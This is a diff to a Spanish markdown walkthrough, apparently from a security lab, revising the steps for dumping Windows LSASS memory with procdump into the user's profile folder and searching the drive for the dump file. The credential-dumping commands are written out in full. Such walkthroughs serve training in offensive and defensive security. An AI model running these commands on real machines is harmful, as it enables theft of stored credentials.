@@ -351,26 +351,35 @@ C:\Tools\Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
 <img width="1028" height="348" alt="imagen" src="https://github.com/user-attachments/assets/da5c68e1-e765-4762-a4b4-fb99d9da92a2" />
 
-Podría llegar a ser un error de arquitectura, utilizamos el otro ejecutable:
+Este error podría deberse a que no tenemos permisos de escritura en el directorio `System32` por lo que probamos crearlo en nuestra carpeta personal. Primero consultamos nuestra dirección de carpeta personal mediante el siguiente comando:
 
 ```cmd
-C:\Tools\Procdump\procdump64a.exe -accepteula -ma lsass.exe lsass.dmp
+echo %USERPROFILE%
 ```
 
-<img width="997" height="533" alt="imagen" src="https://github.com/user-attachments/assets/258fd18d-c6f8-4ebe-bdc0-ca4747f236ca" />
+<img width="431" height="167" alt="imagen" src="https://github.com/user-attachments/assets/89c89ccf-9ca6-4db5-b234-6ab7b7a0e6ed" />
 
 
-Procedemos a realizar el volcado de forma manual:
-<img width="1017" height="769" alt="imagen" src="https://github.com/user-attachments/assets/960a869f-c06a-4727-b65d-dfb406f82e93" />
 
-Nos damos cuenta que el volcado había funcionado porque figura como el segundo archivo con el mismo nombre `(2)`.
+Por lo tanto ejecutamos el dumpeado con el siguiente comando:
 
-Obtenemos la dirección `C:\Users\jordan\AppData\Local\Temp\lsass (2).DMP`
+```cmd
+C:\Tools\Procdump\procdump.exe -accepteula -ma lsass.exe C:\Users\jordan\lsass.dmp
+```
 
+<img width="980" height="248" alt="imagen" src="https://github.com/user-attachments/assets/d7146017-bd86-437d-849a-e81962cad256" />
 
-Podríamos haberlo buscado de forma recursiva mediante el siguiente comando:
+Podríamos buscarlo de forma recursiva mediante el siguiente comando:
 ```cmd
 powershell -Command "Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *lsass*.dmp | Select-Object FullName"
 ```
+
+`Nota`: También podríamos haber realizado el volcado de forma manual obteniendo la dirección `C:\Users\jordan\AppData\Local\Temp\lsass (2).DMP`:
+<img width="1017" height="769" alt="imagen" src="https://github.com/user-attachments/assets/960a869f-c06a-4727-b65d-dfb406f82e93" />
+
+
+
+
+
 
 ---
